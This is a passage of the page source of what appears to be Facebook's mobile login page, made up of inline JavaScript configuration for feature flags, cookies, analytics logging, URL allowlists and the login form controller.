                                        "VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG",
                                        "SNIVY_GROUP_BY_EVENT_TRACE_ID_AND_NAME",
                                        "ADS_STORE_VISITS_METRICS_DEPRECATION",
                                        "DYNAMIC_ADS_SET_CATALOG_AND_PRODUCT_SET_TOGETHER",
                                        "AD_DRAFT_ENABLE_SYNCRHONOUS_FRAGMENT_VALIDATION",
                                        "NEKO_ENABLE_RESET_SAP_FOR_CREATE_AD_SET_CONTEXTUAL",
                                        "SEPARATE_MESSAGING_COMACTIVITY_PAGE_PERMS",
                                        "LAB_NET_NEW_UI_RELEASE",
                                        "POCKET_MONSTERS_CREATE",
                                        "POCKET_MONSTERS_DELETE",
                                        "SRT_BANZAI_SRT_CORE_LOGGER",
                                        "SRT_BANZAI_SRT_MAIN_LOGGER",
                                        "WORKPLACE_PLATFORM_SECURE_APPS_MAILBOXES",
                                        "POCKET_MONSTERS_UPDATE_NAME",
                                        "IC_DISABLE_MERGE_TOOL_FEED_CHECK_FOR_REPLACE_SCHEDULE",
                                        "ADS_EPD_IMPACTED_ADVERTISER_MIGRATE_XCONTROLLER",
                                        "RECRUITING_CANDIDATE_PORTAL_ACCOUNT_DELETION_CARD",
                                    ],
                                },
                                ko: {
                                    __set: [
                                        "8H4bQmEiuLT",
                                        "3OsLvnSHNTt",
                                        "1G7wJ6bJt9K",
                                        "9NpkGYwzrPG",
                                        "3oh5Mw86USj",
                                        "8NAceEy9JZo",
                                        "7FOIzos6XJX",
                                        "rf8JEPGgOi",
                                        "4j36SVzvP3w",
                                        "4NSq3ZC4ScE",
                                        "53gCxKq281G",
                                        "3yzzwBY7Npj",
                                        "1onzIv0jH6H",
                                        "8PlKuowafe8",
                                        "1ntjZ2zgf03",
                                        "4SIH2GRVX5W",
                                        "2dhqRnqXGLQ",
                                        "2WgiNOrHVuC",
                                        "amKHb4Cw4WI",
                                        "5mNEXob0nTj",
                                        "8rDvN9vWdAK",
                                        "9cL5o2kjfZo",
                                        "5BdzWGmfvrA",
                                        "DDZhogI19W",
                                        "acrJTh9WGdp",
                                        "1oOE64fL4wO",
                                        "9Gd8qgRxn8z",
                                        "MPMaqnqZ9c",
                                        "5XCz1h9Iaw3",
                                        "7r6mSP7ofr2",
                                        "6DGPLrRdyts",
                                        "aWxCyi1sEC7",
                                        "9kCSDzzr8fu",
                                    ],
                                },
                            },
                            2580,
                        ],
                        ["JSErrorLoggingConfig", [], { appId: 412378670482, extra: [], reportInterval: 50, sampleWeight: null, sampleWeightKey: "__jssesw", projectBlocklist: [] }, 2776],
                        ["ImmediateImplementationExperiments", [], { prefer_message_channel: true }, 3419],
                        [
                            "UriNeedRawQuerySVConfig",
                            [],
                            {
                                uris: [
                                    "dms.netmng.com",
                                    "doubleclick.net",
                                    "r.msn.com",
                                    "watchit.sky.com",
                                    "graphite.instagram.com",
                                    "www.kfc.co.th",
                                    "learn.pantheon.io",
                                    "www.landmarkshops.in",
                                    "www.ncl.com",
                                    "s0.wp.com",
                                    "www.tatacliq.com",
                                    "bs.serving-sys.com",
                                    "kohls.com",
                                    "lazada.co.th",
                                    "xg4ken.com",
                                    "technopark.ru",
                                    "officedepot.com.mx",
                                    "bestbuy.com.mx",
                                    "booking.com",
                                    "nibio.no",
                                ],
                            },
                            3871,
                        ],
                        ["RunGatingConfig", [], { shouldUseBrowserUnload: true }, 3914],
                        ["InitialCookieConsent", [], { deferCookies: false, initialConsent: { __set: [1, 2] }, noCookies: false, shouldShowCookieBanner: false }, 4328],
                        ["TrustedTypesConfig", [], { useTrustedTypes: false, reportOnly: false }, 4548],
                        ["WebConnectionClassServerGuess", [], { connectionClass: "EXCELLENT" }, 4705],
                        ["BootloaderEndpointConfig", [], { debugNoBatching: false, endpointURI: "https:\/\/m.facebook.com\/ajax\/bootloader-endpoint\/" }, 5094],
                        ["CookieConsentIFrameConfig", [], { consent_param: "FQARERIA.ARY27AWVHrTp3q6pK_UI8QCZWxs2vRN147e5K7T-sua4SkJo", allowlisted_iframes: [] }, 5540],
                        ["cr:696703", [], { __rc: [null, "Aa0DEdfYBGyrVMJxJV-jvqA8KXazdkZ5pvD4tSJdQg7Yw-bWsOuSQtIwfNvDhF9YehL-Dg-Y00JGk4CkS4MoDzYalA4"] }, -1],
                        ["cr:717822", ["TimeSliceImpl"], { __rc: ["TimeSliceImpl", "Aa0DEdfYBGyrVMJxJV-jvqA8KXazdkZ5pvD4tSJdQg7Yw-bWsOuSQtIwfNvDhF9YehL-Dg-Y00JGk4CkS4MoDzYalA4"] }, -1],
                        ["cr:729414", [], { __rc: [null, "Aa1-SqhB5ku6Rs62v0S_HMo0Elio3GPGJ6c0CoYyjyyEFoOwAqZoEHrls9or1Z06fupyMg9mQotLRLzIkdlb5gRF"] }, -1],
                    ],
                    require: [["MPrelude"], ["VisualCompletionGating"], ["RequireDeferredReference", "unblock", [], [["VisualCompletionGating"], "sd"]], ["RequireDeferredReference", "unblock", [], [["VisualCompletionGating"], "css"]]],
                });
            });
        </script>
        <script>
            now_inl = (function () {
                var p = window.performance;
                return p && p.now && p.timing && p.timing.navigationStart
                    ? function () {
                          return p.now() + p.timing.navigationStart;
                      }
                    : function () {
                          return new Date().getTime();
                      };
            })();
            window.__bigPipeFR = now_inl();
        </script>
        <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yE/l/0,cross/-qRujSri_0t.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
        <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y_/l/0,cross/YeHXcRhYV3T.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
        <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yC/r/gO7iX4qiza3.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="hoLQyIrb" />
        <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3imlz4/yD/l/en_GB/V98JWHoppNu.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="hoLQyIrb" />
        <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yA/l/0,cross/CgegNNGYQzw.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
        <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yr/l/0,cross/mFSbOMjboep.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
        <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yb/r/Vy6KblcAv5l.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="hoLQyIrb" />
        <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/2jr_tFUjDMy.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="hoLQyIrb" />
        <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yl/r/ilMFccLWbov.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="hoLQyIrb" />
        <script>
            window.__bigPipeCtor = now_inl();
            requireLazy(["BigPipe"], function (BigPipe) {
                define("__bigPipe", [], (window.bigPipe = new BigPipe({ forceFinish: true, config: { flush_pagelets_asap: true, dispatch_pagelet_replayable_actions: false } })));
            });
        </script>
        <script nonce="hoLQyIrb">
            (function () {
                var n = now_inl();
                requireLazy(["__bigPipe"], function (bigPipe) {
                    bigPipe.beforePageletArrive("first_response", n);
                });
            })();
        </script>
        <script nonce="hoLQyIrb">
            requireLazy(["__bigPipe"], function (bigPipe) {
                bigPipe.onPageletArrive({
                    displayResources: ["0iX5FOK", "MoYpVB9", "/Trsior", "BIIJdhz", "uq5kEmb", "CPTlf3J", "aUdeKFQ", "bJ922yg", "FJqL2Al"],
                    id: "first_response",
                    phase: 0,
                    last_in_phase: true,
                    tti_phase: 0,
                    all_phases: [63],
                    jsmods: {
                        define: [
                            ["CookieDomain", [], { domain: "facebook.com" }, 6421],
                            [
                                "CookieCoreConfig",
                                [],
                                {
                                    c_user: { s: "None" },
                                    cppo: { t: 86400, s: "None" },
                                    dpr: { t: 604800, s: "None" },
                                    fbl_ci: { t: 31536000, s: "None" },
                                    fbl_cs: { t: 31536000, s: "None" },
                                    fbl_st: { t: 31536000, s: "Strict" },
                                    i_user: { s: "None" },
                                    locale: { t: 604800, s: "None" },
                                    m_pixel_ratio: { t: 604800, s: "None" },
                                    noscript: { s: "None" },
                                    presence: { t: 2592000, s: "None" },
                                    sfau: { s: "None" },
                                    usida: { s: "None" },
                                    vpd: { t: 5184000, s: "Lax" },
                                    wd: { t: 604800, s: "Lax" },
                                    "x-referer": { s: "None" },
                                    "x-src": { t: 1, s: "None" },
                                },
                                2104,
                            ],
                            ["FbtQTOverrides", [], { overrides: {} }, 551],
                            ["FbtResultGK", [], { shouldReturnFbtResult: true, inlineMode: "NO_INLINE" }, 876],
                            [
                                "IntlPhonologicalRules",
                                [],
                                { meta: { "/_B/": "([.,!?\\s]|^)", "/_E/": "([.,!?\\s]|$)" }, patterns: { "/\u0001(.*)('|&#039;)s\u0001(?:'|&#039;)s(.*)/": "\u0001$1$2s\u0001$3", "/_\u0001([^\u0001]*)\u0001/": "javascript" } },
                                1496,
                            ],
                            ["IntlViewerContext", [], { GENDER: 3, regionalLocale: null }, 772],
                            [
                                "MJSEnvironment",
                                [],
                                {
                                    IS_APPLE_WEBKIT_IOS: false,
                                    IS_TABLET: false,
                                    IS_ANDROID: false,
                                    IS_CHROME: false,
                                    IS_FIREFOX: true,
                                    IS_WINDOWS_PHONE: false,
                                    IS_SAMSUNG_DEVICE: false,
                                    OS_VERSION: 10,
                                    PIXEL_RATIO: 1,
                                    BROWSER_NAME: "Firefox Desktop",
                                },
                                46,
                            ],
                            ["MLoadingIndicatorSigils", [], { ANIMATE: "m-loading-indicator-animate", ROOT: "m-loading-indicator-root" }, 279],
                            [
                                "NumberFormatConfig",
                                [],
                                { decimalSeparator: ".", numberDelimiter: ",", minDigitsForThousandsSeparator: 4, standardDecimalPatternInfo: { primaryGroupSize: 3, secondaryGroupSize: 3 }, numberingSystemData: null },
                                54,
                            ],
                            [
                                "UserAgentData",
                                [],
                                {
                                    browserArchitecture: "64",
                                    browserFullVersion: "96.0",
                                    browserMinorVersion: 0,
                                    browserName: "Firefox",
                                    browserVersion: 96,
                                    deviceName: "Unknown",
                                    engineName: "Gecko",
                                    engineVersion: "96.0",
                                    platformArchitecture: "64",
                                    platformName: "Windows",
                                    platformVersion: "10",
                                    platformFullVersion: "10",
                                },
                                527,
                            ],
                            ["ZeroCategoryHeader", [], {}, 1127],
                            [
                                "ZeroRewriteRules",
                                [],
                                {
                                    rewrite_rules: {},
                                    whitelist: {
                                        "/hr/r": 1,
                                        "/hr/p": 1,
                                        "/zero/unsupported_browser/": 1,
                                        "/zero/policy/optin": 1,
                                        "/zero/optin/write/": 1,
                                        "/zero/optin/legal/": 1,
                                        "/zero/optin/free/": 1,
                                        "/about/privacy/": 1,
                                        "/about/privacy/update/": 1,
                                        "/about/privacy/update": 1,
                                        "/zero/toggle/welcome/": 1,
                                        "/zero/toggle/nux/": 1,
                                        "/zero/toggle/settings/": 1,
                                        "/fup/interstitial/": 1,
                                        "/work/landing": 1,
                                        "/work/login/": 1,
                                        "/work/email/": 1,
                                        "/ai.php": 1,
                                        "/js_dialog_resources/dialog_descriptions_android.json": 0,
                                        "/connect/jsdialog/MPlatformAppInvitesJSDialog/": 0,
                                        "/connect/jsdialog/MPlatformOAuthShimJSDialog/": 0,
                                        "/connect/jsdialog/MPlatformLikeJSDialog/": 0,
                                        "/qp/interstitial/": 1,
                                        "/qp/action/redirect/": 1,
                                        "/qp/action/close/": 1,
                                        "/zero/support/ineligible/": 1,
                                        "/zero_balance_redirect/": 1,
                                        "/zero_balance_redirect": 1,
                                        "/zero_balance_redirect/l/": 1,
                                        "/l.php": 1,
                                        "/lsr.php": 1,
                                        "/ajax/dtsg/": 1,
                                        "/checkpoint/block/": 1,
                                        "/exitdsite": 1,
                                        "/zero/balance/pixel/": 1,
                                        "/zero/balance/": 1,
                                        "/zero/balance/carrier_landing/": 1,
                                        "/zero/flex/logging/": 1,
                                        "/tr": 1,
                                        "/tr/": 1,
                                        "/sem_campaigns/sem_pixel_test/": 1,
                                        "/bookmarks/flyout/body/": 1,
                                        "/zero/subno/": 1,
                                        "/confirmemail.php": 1,
                                        "/policies/": 1,
                                        "/mobile/internetdotorg/classifier/": 1,
                                        "/zero/dogfooding": 1,
                                        "/xti.php": 1,
                                        "/zero/fblite/config/": 1,
                                        "/hr/zsh/wc/": 1,
                                        "/ajax/bootloader-endpoint/": 1,
                                        "/mobile/zero/carrier_page/": 1,
                                        "/mobile/zero/carrier_page/education_page/": 1,
                                        "/mobile/zero/carrier_page/feature_switch/": 1,
                                        "/mobile/zero/carrier_page/settings_page/": 1,
                                        "/aloha_check_build": 1,
                                        "/upsell/zbd/softnudge/": 1,
                                        "/mobile/zero/af_transition/": 1,
                                        "/mobile/zero/af_transition/action/": 1,
                                        "/mobile/zero/freemium/": 1,
                                        "/mobile/zero/freemium/redirect/": 1,
                                        "/mobile/zero/freemium/zero_fup/": 1,
                                        "/privacy/policy/": 1,
                                        "/privacy/center/": 1,
                                        "/data/manifest/": 1,
                                        "/4oh4.php": 1,
                                        "/autologin.php": 1,
                                        "/birthday_help.php": 1,
                                        "/checkpoint/": 1,
                                        "/contact-importer/": 1,
                                        "/cr.php": 1,
                                        "/legal/terms/": 1,
                                        "/login.php": 1,
                                        "/login/": 1,
                                        "/mobile/account/": 1,
                                        "/n/": 1,
                                        "/remote_test_device/": 1,
                                        "/upsell/buy/": 1,
                                        "/upsell/buyconfirm/": 1,
                                        "/upsell/buyresult/": 1,
                                        "/upsell/promos/": 1,
                                        "/upsell/continue/": 1,
                                        "/upsell/h/promos/": 1,
                                        "/upsell/loan/learnmore/": 1,
                                        "/upsell/purchase/": 1,
                                        "/upsell/promos/upgrade/": 1,
                                        "/upsell/buy_redirect/": 1,
                                        "/upsell/loan/buyconfirm/": 1,
                                        "/upsell/loan/buy/": 1,
                                        "/upsell/sms/": 1,
                                        "/wap/a/channel/reconnect.php": 1,
                                        "/wap/a/nux/wizard/nav.php": 1,
                                        "/wap/appreg.php": 1,
                                        "/wap/birthday_help.php": 1,
                                        "/wap/c.php": 1,
                                        "/wap/confirmemail.php": 1,
                                        "/wap/cr.php": 1,
                                        "/wap/login.php": 1,
                                        "/wap/r.php": 1,
                                        "/zero/datapolicy": 1,
                                        "/a/timezone.php": 1,
                                        "/a/bz": 1,
                                        "/bz/reliability": 1,
                                        "/r.php": 1,
                                        "/mr/": 1,
                                        "/reg/": 1,
                                        "/registration/log/": 1,
                                        "/terms/": 1,
                                        "/f123/": 1,
                                        "/expert/": 1,
                                        "/experts/": 1,
                                        "/terms/index.php": 1,
                                        "/terms.php": 1,
                                        "/srr/": 1,
                                        "/msite/redirect/": 1,
                                        "/fbs/pixel/": 1,
                                        "/contactpoint/preconfirmation/": 1,
                                        "/contactpoint/cliff/": 1,
                                        "/contactpoint/confirm/submit/": 1,
                                        "/contactpoint/confirmed/": 1,
                                        "/contactpoint/login/": 1,
                                        "/preconfirmation/contactpoint_change/": 1,
                                        "/help/contact/": 1,
                                        "/survey/": 1,
                                        "/upsell/loyaltytopup/accept/": 1,
                                        "/settings/": 1,
                                        "/lite/": 1,
                                        "/zero_status_update/": 1,
                                        "/operator_store/": 1,
                                        "/upsell/": 1,
                                        "/wifiauth/login/": 1,
                                    },
                                },
                                1478,
                            ],
                            ["CookieCoreLoggingConfig", [], { maximumIgnorableStallMs: 16.67, sampleRate: 9.7e-5, sampleRateClassic: 1.0e-10, sampleRateFastStale: 1.0e-8 }, 3401],
                            ["IntlNumberTypeConfig", [], { impl: "if (n === 1) { return IntlVariations.NUMBER_ONE; } else { return IntlVariations.NUMBER_OTHER; }" }, 3405],
                            ["ServerTimeData", [], { serverTime: 1643580273592, timeOfRequestStart: 1643580273546.7, timeOfResponseStart: 1643580273546.7 }, 5943],
                            [
                                "MobileAppDetect",
                                [],
                                {
                                    is_mobile_app: false,
                                    is_ads_manager_app: false,
                                    is_pages_manager: false,
                                    is_facebook_for_android: false,
                                    is_facebook_for_android_in_app_browser: false,
                                    is_facebook_for_ios: false,
                                    is_instagram: false,
                                    is_messenger_for_android: false,
                                    is_messenger_for_ios: false,
                                    is_messenger_lite_for_android: false,
                                    is_messenger_lite_for_ios: false,
                                    is_wilde: false,
                                    is_kaios: false,
                                },
                                1109,
                            ],
                            [
                                "MWebStorageMonsterWhiteList",
                                [],
                                {
                                    whitelist: [
                                        "^CacheStorageVersion$",
                                        "^RTC_VIDEO_INPUT$",
                                        "^RTC_AUDIO_INPUT$",
                                        "^RTC_AUDIO_OUTPUT$",
                                        "^RTC_IS_AUDIO_ONLY$",
                                        "^RTC_NOISE_SUPPRESSION$",
                                        "^RTC_MUTE_STATE$",
                                        "^Session$",
                                        "^_oz_",
                                        "^_video_bandwidthEstimate$",
                                        "^Banzai$",
                                        "^bz",
                                        "^banzai\\:last_storage_flush$",
                                        "^falco_queue_",
                                        "^mutex",
                                        "^msys",
                                        "^Bandicoot\\:",
                                        "^imp_seq_num$",
                                        "^qe_switcher_nub_selection$",
                                        "^TabId$",
                                        "^sp_pi$",
                                        "^\\:userchooser\\:osessusers$",
                                        "^\\:userchooser\\:settings$",
                                        "^brands\\:console\\:config$",
                                        "^consoleEnabled$",
                                        "^__fb_messenger_desktop_presence_info$",
                                        "^vc_",
                                        "^_showMDevConsole$",
                                        "^ga_client_id$",
                                        "^_mswam_$",
                                        "^am_recently_used_filters\\:",
                                        "^am_image_size_cache$",
                                        "^ickt$",
                                        "^hb_timestamp$",
                                        "^signal_flush_timestamp$",
                                        "^last_fast_refresh$",
                                        "^_ctv_access_token$",
                                        "^_ctv_android_device_info$",
                                        "^_ctv_cast_access_token$",
                                        "^_ctv_casting_remote$",
                                        "^_ctv_console_log_viewer_on_full_screen_player_enabled$",
                                        "^_ctv_cookie_consent_displayed$",
                                        "^_ctv_debug_redux_logger_enabled$",
                                        "^_ctv_deviceUniqueIDFallback$",
                                        "^_ctv_gaming_consent_displayed$",
                                        "^_ctv_installed_app_player_debug_overlay_enabled$",
                                        "^_ctv_last_load_time_ms$",
                                        "^_ctv_locale$",
                                        "^_ctv_logged_out_constraints_sessions_count$",
                                        "^_ctv_reloadedDueToStaleApp$",
                                        "^_ctv_reloadedDueToUnrecoverableError$",
                                        "^_ctv_search_terms$",
                                        "^_ctv_tv_experiments$",
                                        "^_ctv_usedCloseAppFallback$",
                                        "^_ctv_user_sessions$",
                                        "^_ctv_video_debug_overlay_enabled$",
                                        "^_ctv_debug_rampart_server_number$",
                                        "^fx_did$",
                                        "^wa_lang_banner_dismissed$",
                                        "^bulletin_subscribe_dismissal_count$",
                                        "^bulletin_publication_subscribe_popup_dismissal_count$",
                                        "^bulletin_article_reader_onload_dialog_seen$",
                                        "^bulletin_session_attributes$",
                                    ],
                                },
                                254,
                            ],
                            ["MemoryLoggerConfigWebSitevarConfig", [], { measurement_interval_minutes: 5 }, 5573],
                            ["FWLoader", [], {}, 278],
                            ["ImmediateActiveSecondsConfig", [], { sampling_rate: 0 }, 423],
                            ["MPageControllerGating", [], { shouldDeferUntilCertainNoRedirect: false, shouldReleaseFetcherLock: false, shouldLoadingScreenSetScriptPath: false, shouldRenderAsync404: false }, 2023],
                            [
                                "AnalyticsCoreData",
                                [],
                                {
                                    device_id: "$^|AcamQwD_qo1NL1lNYeuR_T1UWMOKc1uiomv1EKOCSob215N4EylF5SQFJaaxLjIA1NlNwrBpE5Z1CBNJBKJeaKU|fd.AcZuq02_JLScq4_0QG4CxnW7agh1YdpwXLcpMM6Q_2S-CljPOdmiD1OZRu1DyaYoAhoyrg2RctZeWsmA_7GF0KRg",
                                    app_id: "412378670482",
                                    enable_bladerunner: false,
                                    enable_ack: true,
                                    push_phase: "C3",
                                    enable_observer: false,
                                    enable_dataloss_timer: false,
                                },
                                5237,
                            ],
                            ["cr:1642797", ["BanzaiBase"], { __rc: ["BanzaiBase", "Aa0DEdfYBGyrVMJxJV-jvqA8KXazdkZ5pvD4tSJdQg7Yw-bWsOuSQtIwfNvDhF9YehL-Dg-Y00JGk4CkS4MoDzYalA4"] }, -1],
                            ["cr:694370", ["requestIdleCallbackBlue"], { __rc: ["requestIdleCallbackBlue", "Aa0DEdfYBGyrVMJxJV-jvqA8KXazdkZ5pvD4tSJdQg7Yw-bWsOuSQtIwfNvDhF9YehL-Dg-Y00JGk4CkS4MoDzYalA4"] }, -1],
                            ["cr:692209", ["cancelIdleCallbackBlue"], { __rc: ["cancelIdleCallbackBlue", "Aa0DEdfYBGyrVMJxJV-jvqA8KXazdkZ5pvD4tSJdQg7Yw-bWsOuSQtIwfNvDhF9YehL-Dg-Y00JGk4CkS4MoDzYalA4"] }, -1],
                            [
                                "MBanzaiConfig",
                                [],
                                {
                                    MAX_SIZE: 10000,
                                    MAX_WAIT: 30000,
                                    MIN_WAIT: null,
                                    RESTORE_WAIT: 30000,
                                    blacklist: ["time_spent"],
                                    disabled: false,
                                    gks: { platform_oauth_client_events: true, boosted_pagelikes: true },
                                    known_routes: [
                                        "artillery_javascript_actions",
                                        "artillery_javascript_trace",
                                        "artillery_logger_data",
                                        "logger",
                                        "falco",
                                        "gk2_exposure",
                                        "js_error_logging",
                                        "loom_trace",
                                        "marauder",
                                        "perfx_custom_logger_endpoint",
                                        "qex",
                                        "require_cond_exposure_logging",
                                        "sri_logger_data",
                                    ],
                                    should_drop_unknown_routes: true,
                                    should_log_unknown_routes: false,
                                },
                                32,
                            ],
                        ],
                        elements: [
                            ["__elem_de5177dd_0_0_tg", "u_0_0_ZF", 1],
                            ["__elem_921b58ef_0_0_z4", "login_form", 2],
                            ["__elem_e24cb174_0_0_nN", "m_login_password", 1],
                            ["__elem_7216e2ae_0_2_QU", "u_0_1_V8", 1],
                            ["__elem_e03291d5_0_1_j1", "u_0_2_Dw", 1],
                            ["__elem_e03291d5_0_0_k1", "u_0_3_pB", 1],
                            ["__elem_7216e2ae_0_0_go", "login_password_step_element", 1],
                            ["__elem_8a020238_0_0_YB", "forgot-password-link", 1],
                            ["__elem_7216e2ae_0_1_vJ", "signup_button_area", 1],
                            ["__elem_e980dec4_0_0_PF", "signup-button", 1],
                            ["__elem_49f6b607_0_0_x2", "root", 1],
                            ["__elem_eed16c0a_0_0_e1", "u_0_4_QS", 1],
                            ["__elem_a588f507_0_0_vH", "u_0_5_ZW", 1],
                            ["__elem_a588f507_0_1_ce", "u_0_6_Ku", 1],
                            ["__elem_0cdc66ad_0_0_Rd", "u_0_8_IJ", 1],
                            ["__elem_0cdc66ad_0_1_oU", "u_0_9_5v", 1],
                        ],
                        require: [
                            ["ForgetPasswordAutoSearch", "addListenerForgetPasswordAutoSearch", [], ["m_login_email", "m_login_auto_search_form_contactpoint_hidden_input", "m_login_auto_search_form_forgot_password_button"]],
                            ["MLoginController", "initAccountRecoveryFunnelLogging", ["__elem_8a020238_0_0_YB"], [{ __m: "__elem_8a020238_0_0_YB" }, "click_forget_password", "uxzjYQ-EQZKa07nUsGdfpkCt"]],
                            ["MGetInstalledRelatedApps", "logmTouchInstalledRelatedApps", [], ["uxzjYQ-EQZKa07nUsGdfpkCt"]],
                            ["BrowserPrefillLogging", "initContactpointFieldLogging", [], [{ contactpointFieldID: "m_login_email", serverPrefill: "" }]],
                            ["BrowserPrefillLogging", "initPasswordFieldLogging", [], [{ passwordFieldID: "m_login_password" }]],
                            ["PlatformDialogCBTSetter", "setCBTInFormAndLog", ["__elem_921b58ef_0_0_z4"], [{ __m: "__elem_921b58ef_0_0_z4" }, "client_logged_out_init_impression"]],
                            ["MLoginView", "disableOnSubmit", ["__elem_921b58ef_0_0_z4", "__elem_7216e2ae_0_0_go"], [{ __m: "__elem_921b58ef_0_0_z4" }, { __m: "__elem_7216e2ae_0_0_go" }]],
                            ["MLoginController", "initRegButton", ["__elem_7216e2ae_0_1_vJ"], [{ root: { __m: "__elem_7216e2ae_0_1_vJ" }, regURI: "/reg-no-deeplink/?cid=103", useRegToLogin: true }]],
                            [
                                "MLoginController",
                                "initLoginForm",
                                ["__elem_de5177dd_0_0_tg"],
                                [
                                    {
                                        root: { __m: "__elem_de5177dd_0_0_tg" },
                                        ajaxURI: "/login/device-based/login/async/?refsrc=deprecated&lwv=100",
                                        clearOnDelete: false,
                                        listenKeyDown: false,
                                        isTwoStepsLogin: false,
                                        isActionLoggingEnabled: true,
                                        isCredsManagerEnabled: false,
                                        isCredsSavingEnabled: true,
                                        isPasswordlessEnabled: false,
                                        doNotShowUserHeader: false,
                                        shouldWaitForPasswordSave: false,
                                        onErrorRegURI: "/r.php",
                                        shouldAutoLandOnStep2: false,
                                        shouldPrefillJioHeaderForRegFromLogin: false,
                                        shouldProcessUserConsentForTokenHeader: false,
                                        shouldProcessUserConsentForHeader: false,
                                        shouldShowSmartLockSelector: false,
                                        shouldRunBotDetection: false,
                                        clearPrefillMaskOnKeydown: false,
                                        datrCookie: "uxzjYQ-EQZKa07nUsGdfpkCt",
                                        pubKeyData: { publicKey: "cb79ea5ad2ada6ec3133185f282779e481f0bffc52b3f7c93b159363bb59890c", keyId: 29 },
                                        shouldUseEmailDomainTypeahead: false,
                                        showDuoLikePasswordless: false,
                                        showSingleStepDuoLikePasswordless: false,
                                        trackingPreference: "install_from_passwordless_flow",
                                    },
                                ],
                            ],
                            [
                                "MPasswordPlainTextToggle",
                                "init",
                                ["__elem_e24cb174_0_0_nN", "__elem_7216e2ae_0_2_QU", "__elem_e03291d5_0_0_k1", "__elem_e03291d5_0_1_j1"],
                                [{ __m: "__elem_e24cb174_0_0_nN" }, { __m: "__elem_7216e2ae_0_2_QU" }, { __m: "__elem_e03291d5_0_0_k1" }, { __m: "__elem_e03291d5_0_1_j1" }],
                            ],
                            ["ServiceWorkerLoginAndLogoutListener", "listen", [], ["login_button_block", "login", "/sw?s=push", null]],
                            ["MTouchable"],
                            ["MBlockingTouchable", "init", ["__elem_e980dec4_0_0_PF"], [{ __m: "__elem_e980dec4_0_0_PF" }]],
                            ["AccessibilityWebVirtualCursorClickLogger", "init", ["__elem_49f6b607_0_0_x2"], [[{ __m: "__elem_49f6b607_0_0_x2" }]]],
                            ["GHLSurvey", "survey", [], []],
                            ["MScrollPositionSaver"],
                            ["InitMAjaxify"],
                            ["MLogoutClearCache"],
                            [
                                "LoadingIndicator",
                                "init",
                                ["__elem_eed16c0a_0_0_e1", "__elem_a588f507_0_0_vH", "__elem_a588f507_0_1_ce"],
                                [{ __m: "__elem_eed16c0a_0_0_e1" }, { __m: "__elem_a588f507_0_0_vH" }, { __m: "__elem_a588f507_0_1_ce" }],
                            ],
                            ["MPageError"],
                            ["MPageHeaderAccessibility"],
                            ["MBlockingTouchable", "init", ["__elem_0cdc66ad_0_0_Rd"], [{ __m: "__elem_0cdc66ad_0_0_Rd" }]],
                            ["MBlockingTouchable", "init", ["__elem_0cdc66ad_0_1_oU"], [{ __m: "__elem_0cdc66ad_0_1_oU" }]],
                            ["MLoadingIndicator", "init", [], ["u_0_7_TL"]],
                            ["LogHistoryListeners"],
                            ["ScriptPath", "set", [], ["XLoginController", "4e6eefd9", { imp_id: "2NhPr400vMvgl1GEy", ef_page: null }]],
                            ["MCommentViewportTracking", "singleton", [], [{ enabled: true, debug_console: false, debug_html: false, idle_timeout: 5000, min_duration_to_log: 100, min_visible_size: 200 }]],
                            ["MLogging", "main", [], [{ refid: 0 }]],
                            ["RemoteDevice", "init", [], [{ performHardwareDetection: false, hashId: null, vpd: false }]],
                            ["Artillery"],
                            ["MLinkHack"],
                            ["MModalDialogInit"],
                            ["MVerifyCache", "main", [], [{ viewer: 0 }]],
                            ["EventProfiler"],
                            ["MPageNavigationTracking", "init", [], []],
                            ["FalcoLoggerTransports", "attach", [], []],
                            ["ScriptPathLogger", "startLogging", [], []],
                            ["MTimeSpentBitArrayLogger", "init", [], ["m", false]],
                            ["MCoreDeferred"],
                            ["FbtLogging"],
                            ["IntlQtEventFalcoEvent"],
                            ["BanzaiScuba_DEPRECATED"],
                            ["MPageControllerImpl"],
                            ["LogWebMemoryUsageFalcoEvent"],
                            ["MPageFetcherImpl"],
                            ["json-bigint"],
                            [
                                "RequireDeferredReference",
                                "unblock",
                                [],
                                [["FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED", "MPageControllerImpl", "LogWebMemoryUsageFalcoEvent", "VisualCompletionGating", "MPageFetcherImpl", "json-bigint"], "sd"],
                            ],
                            [
                                "RequireDeferredReference",
                                "unblock",
                                [],
                                [["FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED", "MPageControllerImpl", "LogWebMemoryUsageFalcoEvent", "VisualCompletionGating", "MPageFetcherImpl", "json-bigint"], "css"],
                            ],
                        ],
                        pre_display_requires: [
                            ["AddressBar", "setupLoadListener", [], [], 4],
                            ["MobileBigPipeStratcomProxy", "init", [], [], 4],
                            ["Stratcom", "init", [], [], 4],
                            ["MViewport", "init", [], [], 4],
                            ["ViewportDimensions", "init", [], [], 4],
                            ["MPageController", "init", [], [], 4],
                            ["onSyncTTI", "run", [], [], 4],
                            ["MLiteInit", "init", [], [], 4],
                        ],
                    },
                    hsrp: {
                        hsdp: {
                            bxData: { "875231": { uri: "https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico" } },
                            clpData: {
                                "1744178": { r: 1, s: 1 },
                                "1814852": { r: 1 },
                                "1838142": { r: 1, s: 1 },
